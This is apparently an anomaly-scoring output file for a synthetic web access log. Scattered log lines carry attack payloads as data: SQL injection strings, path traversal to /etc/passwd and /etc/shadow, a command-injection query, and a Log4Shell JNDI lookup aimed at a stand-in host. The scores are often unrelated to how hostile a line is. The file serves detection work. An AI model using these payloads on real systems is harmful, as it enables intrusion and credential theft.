score_content,score_session,score_fused,score_fused_norm,line
27.497386932373047,,27.497386932373047,27.497386932373047,220.247.99.28 - - [10/Jan/2025:12:16:03 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 10569 "https://www.google.com/" "python-requests/2.31.0"
0.3143121898174286,,0.3143121898174286,0.3143121898174286,212.94.125.177 - - [10/Jan/2025:12:16:03 +0000] "GET /index.html HTTP/1.1" 200 348 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
4.6955976486206055,,4.6955976486206055,4.6955976486206055,235.110.31.132 - - [10/Jan/2025:12:16:04 +0000] "GET /contact HTTP/1.1" 302 13656 "https://news.ycombinator.com/" "curl/7.85.0"
71.63516998291016,,71.63516998291016,71.63516998291016,188.151.71.85 - - [10/Jan/2025:12:16:05 +0000] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 18571 "-" "nikto/2.5.0"
99.0486068725586,,99.0486068725586,99.0486068725586,192.7.98.230 - - [10/Jan/2025:12:16:07 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 304 16563 "-" "curl/7.85.0"
50.567832946777344,,50.567832946777344,50.567832946777344,102.36.8.200 - - [10/Jan/2025:12:16:10 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 10062 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.1811130046844482,,2.1811130046844482,2.1811130046844482,150.197.59.214 - - [10/Jan/2025:12:16:11 +0000] "GET / HTTP/1.1" 200 15506 "https://example.com/" "dirb/2.22"
24.776222229003906,,24.776222229003906,24.776222229003906,249.47.40.146 - - [10/Jan/2025:12:16:13 +0000] "GET /api/product?id=123 HTTP/1.1" 200 9784 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.18982252478599548,,0.18982252478599548,0.18982252478599548,225.243.108.121 - - [10/Jan/2025:12:16:15 +0000] "GET /assets/app.css HTTP/1.1" 200 7180 "https://www.google.com/" "python-requests/2.31.0"
36.17702865600586,,36.17702865600586,36.17702865600586,241.10.124.99 - - [10/Jan/2025:12:16:16 +0000] "PUT /search?q=laptop HTTP/1.1" 200 4430 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.697620391845703,,27.697620391845703,27.697620391845703,140.110.64.39 - - [10/Jan/2025:12:16:17 +0000] "DELETE /profile HTTP/1.1" 200 15149 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
36.13724136352539,,36.13724136352539,36.13724136352539,130.192.234.120 - - [10/Jan/2025:12:16:17 +0000] "PUT /search?q=headphones HTTP/1.1" 204 12866 "-" "nikto/2.5.0"
50.67739486694336,,50.67739486694336,50.67739486694336,65.87.78.229 - - [10/Jan/2025:12:16:17 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 8151 "https://news.ycombinator.com/" "curl/7.85.0"
74.62024688720703,,74.62024688720703,74.62024688720703,114.101.214.47 - - [10/Jan/2025:12:16:20 +0000] "OPTIONS /wp-login.php HTTP/1.1" 304 15264 "https://example.com/" "python-requests/2.31.0"
0.22600890696048737,,0.22600890696048737,0.22600890696048737,137.232.97.164 - - [10/Jan/2025:12:16:22 +0000] "GET /wp-login.php HTTP/1.1" 200 1161 "https://www.google.com/" "curl/7.85.0"
76.1014175415039,,76.1014175415039,76.1014175415039,76.85.209.93 - - [10/Jan/2025:12:16:24 +0000] "OPTIONS /server-status HTTP/1.1" 304 16575 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.464111328125,,73.464111328125,73.464111328125,219.184.32.239 - - [10/Jan/2025:12:16:24 +0000] "OPTIONS /logout HTTP/1.1" 200 15276 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
30.56761360168457,,30.56761360168457,30.56761360168457,91.205.203.98 - - [10/Jan/2025:12:16:27 +0000] "DELETE /login HTTP/1.1" 302 18132 "-" "dirb/2.22"
30172.001953125,,30172.001953125,30172.001953125,204.200.235.38 - - [10/Jan/2025:12:16:29 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 404 328 "https://twitter.com/" "sqlmap/1.7.2#stable"
30121.9375,,30121.9375,30121.9375,229.109.236.31 - - [10/Jan/2025:12:16:29 +0000] "GET /assets/app.js HTTP/1.1" 400 696 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30167.337890625,,30167.337890625,30167.337890625,110.54.245.58 - - [10/Jan/2025:12:16:32 +0000] "HEAD /.env HTTP/1.1" 401 1477 "https://example.com/" "nikto/2.5.0"
16.26068878173828,,16.26068878173828,16.26068878173828,168.58.209.4 - - [10/Jan/2025:12:16:32 +0000] "PUT /login HTTP/1.1" 304 4835 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30194.173828125,,30194.173828125,30194.173828125,69.110.226.189 - - [10/Jan/2025:12:16:35 +0000] "OPTIONS /login HTTP/1.1" 403 1016 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
36.174442291259766,,36.174442291259766,36.174442291259766,196.66.48.50 - - [10/Jan/2025:12:16:35 +0000] "PUT /search?q=laptop HTTP/1.1" 200 1476 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30122.037109375,,30122.037109375,30122.037109375,184.59.194.12 - - [10/Jan/2025:12:16:36 +0000] "GET /assets/app.css HTTP/1.1" 403 862 "https://example.com/" "python-requests/2.31.0"
30135.15625,,30135.15625,30135.15625,209.8.8.161 - - [10/Jan/2025:12:16:37 +0000] "PUT /phpmyadmin HTTP/1.1" 403 698 "https://www.google.com/" "sqlmap/1.7.2#stable"
47.60457992553711,,47.60457992553711,47.60457992553711,57.205.230.26 - - [10/Jan/2025:12:16:40 +0000] "HEAD /phpmyadmin HTTP/1.1" 204 12573 "https://www.google.com/" "nikto/2.5.0"
39.05715560913086,,39.05715560913086,39.05715560913086,248.209.50.252 - - [10/Jan/2025:12:16:40 +0000] "PUT /search?q=ssd HTTP/1.1" 302 8630 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
36.20967102050781,,36.20967102050781,36.20967102050781,234.244.43.79 - - [10/Jan/2025:12:16:41 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7588 "https://example.com/" "python-requests/2.31.0"
2.184234857559204,,2.184234857559204,2.184234857559204,208.82.81.195 - - [10/Jan/2025:12:16:42 +0000] "GET / HTTP/1.1" 200 16621 "https://news.ycombinator.com/" "curl/7.85.0"
30122.068359375,,30122.068359375,30122.068359375,219.63.59.213 - - [10/Jan/2025:12:16:43 +0000] "GET /assets/app.js HTTP/1.1" 403 619 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30122.08203125,,30122.08203125,30122.08203125,151.70.226.45 - - [10/Jan/2025:12:16:43 +0000] "GET /assets/app.css HTTP/1.1" 404 765 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.415895462036133,,27.415895462036133,27.415895462036133,128.163.83.125 - - [10/Jan/2025:12:16:43 +0000] "GET /search?q=headphones HTTP/1.1" 302 2457 "https://twitter.com/" "python-requests/2.31.0"
3.05661940574646,,3.05661940574646,3.05661940574646,214.196.68.218 - - [10/Jan/2025:12:16:46 +0000] "POST /../../etc/passwd HTTP/1.1" 200 11907 "https://www.google.com/" "curl/7.85.0"
2.14835262298584,,2.14835262298584,2.14835262298584,233.139.122.53 - - [10/Jan/2025:12:16:48 +0000] "GET / HTTP/1.1" 200 5646 "https://news.ycombinator.com/" "dirb/2.22"
27.664501190185547,,27.664501190185547,27.664501190185547,250.78.66.147 - - [10/Jan/2025:12:16:51 +0000] "DELETE /contact HTTP/1.1" 200 5303 "https://example.com/" "dirb/2.22"
96.2481689453125,,96.2481689453125,96.2481689453125,85.10.45.196 - - [10/Jan/2025:12:16:54 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 17256 "-" "curl/7.85.0"
11094.65234375,,11094.65234375,11094.65234375,34.167.13.225 - - [10/Jan/2025:12:16:56 +0000] "OPTIONS /server-status HTTP/1.1" 503 1283 "https://news.ycombinator.com/" "dirb/2.22"
13.40134334564209,,13.40134334564209,13.40134334564209,222.120.159.56 - - [10/Jan/2025:12:16:56 +0000] "PUT /profile HTTP/1.1" 200 17625 "https://www.google.com/" "dirb/2.22"
96.22709655761719,,96.22709655761719,96.22709655761719,207.213.17.245 - - [10/Jan/2025:12:16:59 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 5325 "https://news.ycombinator.com/" "python-requests/2.31.0"
30149.251953125,,30149.251953125,30149.251953125,44.30.190.199 - - [10/Jan/2025:12:17:02 +0000] "DELETE /logout HTTP/1.1" 404 824 "https://news.ycombinator.com/" "nikto/2.5.0"
50.5910758972168,,50.5910758972168,50.5910758972168,189.3.106.93 - - [10/Jan/2025:12:17:02 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 297 "https://www.google.com/" "sqlmap/1.7.2#stable"
127.64954376220703,,127.64954376220703,127.64954376220703,24.20.178.127 - - [10/Jan/2025:12:17:04 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 2207 "https://example.com/" "curl/7.85.0"
27.59857177734375,,27.59857177734375,27.59857177734375,247.46.14.175 - - [10/Jan/2025:12:17:05 +0000] "POST /search?q=camera HTTP/1.1" 200 9376 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.23919767141342163,,0.23919767141342163,0.23919767141342163,230.158.27.147 - - [10/Jan/2025:12:17:08 +0000] "GET /assets/app.js HTTP/1.1" 200 15634 "-" "sqlmap/1.7.2#stable"
74.84288787841797,,74.84288787841797,74.84288787841797,114.72.134.116 - - [10/Jan/2025:12:17:09 +0000] "OPTIONS /.env HTTP/1.1" 304 7289 "https://news.ycombinator.com/" "dirb/2.22"
4.648746967315674,,4.648746967315674,4.648746967315674,8.247.117.165 - - [10/Jan/2025:12:17:10 +0000] "GET /api/products HTTP/1.1" 302 8347 "https://example.com/" "sqlmap/1.7.2#stable"
1.8758208751678467,,1.8758208751678467,1.8758208751678467,132.123.239.179 - - [10/Jan/2025:12:17:12 +0000] "GET /contact HTTP/1.1" 200 5264 "-" "Wget/1.21.2 (linux-gnu)"
4.80231237411499,,4.80231237411499,4.80231237411499,4.29.195.122 - - [10/Jan/2025:12:17:13 +0000] "POST /profile HTTP/1.1" 200 16596 "https://example.com/" "nikto/2.5.0"
47.688236236572266,,47.688236236572266,47.688236236572266,128.19.165.254 - - [10/Jan/2025:12:17:13 +0000] "HEAD /api/products HTTP/1.1" 200 18373 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.639242172241211,,4.639242172241211,4.639242172241211,14.47.161.143 - - [10/Jan/2025:12:17:15 +0000] "GET /profile HTTP/1.1" 301 2049 "https://www.google.com/" "python-requests/2.31.0"
30.491172790527344,,30.491172790527344,30.491172790527344,220.49.61.66 - - [10/Jan/2025:12:17:17 +0000] "DELETE /api/products HTTP/1.1" 304 11671 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.741074562072754,,11.741074562072754,11.741074562072754,11.75.30.121 - - [10/Jan/2025:12:17:19 +0000] "PUT /wp-login.php HTTP/1.1" 200 13208 "https://www.google.com/" "sqlmap/1.7.2#stable"
7.700077533721924,,7.700077533721924,7.700077533721924,187.173.6.248 - - [10/Jan/2025:12:17:19 +0000] "POST /about HTTP/1.1" 304 15754 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.1799352169036865,,2.1799352169036865,2.1799352169036865,27.203.66.208 - - [10/Jan/2025:12:17:19 +0000] "GET / HTTP/1.1" 200 15095 "https://example.com/" "python-requests/2.31.0"
73.45864868164062,,73.45864868164062,73.45864868164062,42.145.82.208 - - [10/Jan/2025:12:17:21 +0000] "OPTIONS /login HTTP/1.1" 200 1797 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
104.89334106445312,,104.89334106445312,104.89334106445312,94.180.61.120 - - [10/Jan/2025:12:17:24 +0000] "TRACE /login HTTP/1.1" 200 4468 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
36.18181610107422,,36.18181610107422,36.18181610107422,153.53.164.111 - - [10/Jan/2025:12:17:25 +0000] "PUT /search?q=camera HTTP/1.1" 200 5767 "https://news.ycombinator.com/" "curl/7.85.0"
76.20220184326172,,76.20220184326172,76.20220184326172,212.9.90.52 - - [10/Jan/2025:12:17:26 +0000] "OPTIONS /contact HTTP/1.1" 301 14983 "https://example.com/" "python-requests/2.31.0"
70.51261138916016,,70.51261138916016,70.51261138916016,215.164.253.174 - - [10/Jan/2025:12:17:28 +0000] "HEAD /search?q=router HTTP/1.1" 200 625 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
1.7858303785324097,,1.7858303785324097,1.7858303785324097,94.108.138.232 - - [10/Jan/2025:12:17:30 +0000] "GET /phpmyadmin HTTP/1.1" 200 5532 "https://twitter.com/" "dirb/2.22"
27.726280212402344,,27.726280212402344,27.726280212402344,131.105.8.233 - - [10/Jan/2025:12:17:30 +0000] "DELETE /about HTTP/1.1" 200 3017 "https://example.com/" "python-requests/2.31.0"
50.52010726928711,,50.52010726928711,50.52010726928711,181.94.198.39 - - [10/Jan/2025:12:17:33 +0000] "DELETE /search?q=router HTTP/1.1" 200 15694 "https://www.google.com/" "dirb/2.22"
30191.705078125,,30191.705078125,30191.705078125,134.122.229.51 - - [10/Jan/2025:12:17:34 +0000] "HEAD /search?q=router HTTP/1.1" 403 199 "https://www.google.com/" "nikto/2.5.0"
27.55157470703125,,27.55157470703125,27.55157470703125,112.80.97.213 - - [10/Jan/2025:12:17:35 +0000] "POST /search?q=headphones HTTP/1.1" 200 14572 "-" "nikto/2.5.0"
127.68473815917969,,127.68473815917969,127.68473815917969,56.241.9.13 - - [10/Jan/2025:12:17:35 +0000] "TRACE /search?q=router HTTP/1.1" 200 12962 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
96.40424346923828,,96.40424346923828,96.40424346923828,232.46.191.111 - - [10/Jan/2025:12:17:37 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 4339 "-" "dirb/2.22"
30146.744140625,,30146.744140625,30146.744140625,62.149.192.248 - - [10/Jan/2025:12:17:37 +0000] "GET /api/product?id=123 HTTP/1.1" 400 1335 "https://news.ycombinator.com/" "dirb/2.22"
96.29370880126953,,96.29370880126953,96.29370880126953,239.155.235.137 - - [10/Jan/2025:12:17:37 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 5726 "-" "nikto/2.5.0"
36.115116119384766,,36.115116119384766,36.115116119384766,32.56.37.104 - - [10/Jan/2025:12:17:37 +0000] "PUT /search?q=headphones HTTP/1.1" 200 1093 "https://example.com/" "nikto/2.5.0"
27.704347610473633,,27.704347610473633,27.704347610473633,85.63.61.34 - - [10/Jan/2025:12:17:37 +0000] "DELETE /contact HTTP/1.1" 200 17564 "https://twitter.com/" "curl/7.85.0"
0.17498372495174408,,0.17498372495174408,0.17498372495174408,178.157.142.240 - - [10/Jan/2025:12:17:39 +0000] "GET /assets/app.css HTTP/1.1" 200 2401 "-" "python-requests/2.31.0"
36.19026565551758,,36.19026565551758,36.19026565551758,59.93.134.18 - - [10/Jan/2025:12:17:39 +0000] "PUT /search?q=monitor HTTP/1.1" 200 13631 "https://news.ycombinator.com/" "python-requests/2.31.0"
27.65083122253418,,27.65083122253418,27.65083122253418,138.89.185.50 - - [10/Jan/2025:12:17:39 +0000] "POST /api/user?id=1;DROP TABLE users HTTP/1.1" 200 6276 "-" "curl/7.85.0"
0.19405728578567505,,0.19405728578567505,0.19405728578567505,179.148.18.230 - - [10/Jan/2025:12:17:39 +0000] "GET /assets/app.css HTTP/1.1" 200 8352 "https://twitter.com/" "nikto/2.5.0"
30157.98828125,,30157.98828125,30157.98828125,21.167.148.227 - - [10/Jan/2025:12:17:40 +0000] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 1245 "https://example.com/" "curl/7.85.0"
36.17793273925781,,36.17793273925781,36.17793273925781,133.184.152.27 - - [10/Jan/2025:12:17:41 +0000] "PUT /search?q=monitor HTTP/1.1" 200 9799 "-" "python-requests/2.31.0"
2.8570470809936523,,2.8570470809936523,2.8570470809936523,172.240.195.226 - - [10/Jan/2025:12:17:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 301 10293 "https://example.com/" "dirb/2.22"
96.33002471923828,,96.33002471923828,96.33002471923828,224.172.128.145 - - [10/Jan/2025:12:17:45 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 16663 "https://example.com/" "dirb/2.22"
30126.6640625,,30126.6640625,30126.6640625,111.77.123.251 - - [10/Jan/2025:12:17:48 +0000] "POST /logout HTTP/1.1" 401 432 "-" "nikto/2.5.0"
13.43301773071289,,13.43301773071289,13.43301773071289,166.118.214.134 - - [10/Jan/2025:12:17:51 +0000] "PUT /about HTTP/1.1" 200 6001 "https://example.com/" "python-requests/2.31.0"
1.8722771406173706,,1.8722771406173706,1.8722771406173706,133.24.190.236 - - [10/Jan/2025:12:17:52 +0000] "GET /profile HTTP/1.1" 200 4252 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.65967559814453,,27.65967559814453,27.65967559814453,59.251.68.249 - - [10/Jan/2025:12:17:53 +0000] "DELETE /contact HTTP/1.1" 204 5520 "https://example.com/" "dirb/2.22"
27.604900360107422,,27.604900360107422,27.604900360107422,188.173.137.218 - - [10/Jan/2025:12:17:54 +0000] "POST /search?q=phone HTTP/1.1" 200 5556 "https://example.com/" "nikto/2.5.0"
127.65043640136719,,127.65043640136719,127.65043640136719,19.150.110.219 - - [10/Jan/2025:12:17:57 +0000] "TRACE /search?q=router HTTP/1.1" 200 2995 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.38295841217041,,13.38295841217041,13.38295841217041,76.39.232.223 - - [10/Jan/2025:12:17:58 +0000] "PUT /profile HTTP/1.1" 200 11392 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
27.65809440612793,,27.65809440612793,27.65809440612793,97.105.236.67 - - [10/Jan/2025:12:18:00 +0000] "POST /api/product?id=123 HTTP/1.1" 200 639 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.56584167480469,,50.56584167480469,50.56584167480469,86.204.29.39 - - [10/Jan/2025:12:18:02 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 9481 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
27.576435089111328,,27.576435089111328,27.576435089111328,228.134.99.188 - - [10/Jan/2025:12:18:05 +0000] "POST /search?q=monitor HTTP/1.1" 200 8350 "https://twitter.com/" "nikto/2.5.0"
27.6581974029541,,27.6581974029541,27.6581974029541,244.75.205.181 - - [10/Jan/2025:12:18:06 +0000] "DELETE /contact HTTP/1.1" 200 3407 "https://example.com/" "curl/7.85.0"
2.9547576904296875,,2.9547576904296875,2.9547576904296875,252.248.162.233 - - [10/Jan/2025:12:18:06 +0000] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 1175 "-" "dirb/2.22"
4.5214338302612305,,4.5214338302612305,4.5214338302612305,79.69.41.1 - - [10/Jan/2025:12:18:09 +0000] "GET /server-status HTTP/1.1" 301 18065 "https://news.ycombinator.com/" "dirb/2.22"
36.22541046142578,,36.22541046142578,36.22541046142578,245.8.197.202 - - [10/Jan/2025:12:18:09 +0000] "PUT /search?q=camera HTTP/1.1" 200 19702 "https://example.com/" "python-requests/2.31.0"
96.26506042480469,,96.26506042480469,96.26506042480469,212.84.70.21 - - [10/Jan/2025:12:18:12 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 10235 "https://twitter.com/" "nikto/2.5.0"
48.892967224121094,,48.892967224121094,48.892967224121094,48.85.67.110 - - [10/Jan/2025:12:18:13 +0000] "HEAD /wp-login.php HTTP/1.1" 304 12718 "https://www.google.com/" "sqlmap/1.7.2#stable"
50.518733978271484,,50.518733978271484,50.518733978271484,20.47.38.154 - - [10/Jan/2025:12:18:16 +0000] "DELETE /search?q=phone HTTP/1.1" 200 591 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.868378162384033,,4.868378162384033,4.868378162384033,208.168.51.245 - - [10/Jan/2025:12:18:18 +0000] "POST /admin HTTP/1.1" 200 15526 "https://www.google.com/" "dirb/2.22"
50.574729919433594,,50.574729919433594,50.574729919433594,131.224.106.49 - - [10/Jan/2025:12:18:20 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 12158 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.173924446105957,,2.173924446105957,2.173924446105957,66.210.184.210 - - [10/Jan/2025:12:18:20 +0000] "GET / HTTP/1.1" 200 13076 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.42476749420166,,13.42476749420166,13.42476749420166,191.44.158.31 - - [10/Jan/2025:12:18:20 +0000] "PUT /login HTTP/1.1" 200 3623 "-" "python-requests/2.31.0"
47.756507873535156,,47.756507873535156,47.756507873535156,71.16.142.40 - - [10/Jan/2025:12:18:22 +0000] "HEAD /login HTTP/1.1" 200 8556 "https://example.com/" "python-requests/2.31.0"
104.79308319091797,,104.79308319091797,104.79308319091797,86.132.229.152 - - [10/Jan/2025:12:18:22 +0000] "TRACE /dashboard HTTP/1.1" 200 13322 "https://example.com/" "sqlmap/1.7.2#stable"
45.88064956665039,,45.88064956665039,45.88064956665039,245.119.114.121 - - [10/Jan/2025:12:18:24 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 8246 "https://twitter.com/" "dirb/2.22"
127.78279113769531,,127.78279113769531,127.78279113769531,106.114.22.79 - - [10/Jan/2025:12:18:24 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7209 "https://example.com/" "dirb/2.22"
3.137396812438965,,3.137396812438965,3.137396812438965,148.180.48.107 - - [10/Jan/2025:12:18:25 +0000] "POST /wp-login.php HTTP/1.1" 200 10821 "https://news.ycombinator.com/" "nikto/2.5.0"
104.72891235351562,,104.72891235351562,104.72891235351562,223.145.59.173 - - [10/Jan/2025:12:18:28 +0000] "TRACE /phpmyadmin HTTP/1.1" 200 2213 "https://www.google.com/" "nikto/2.5.0"
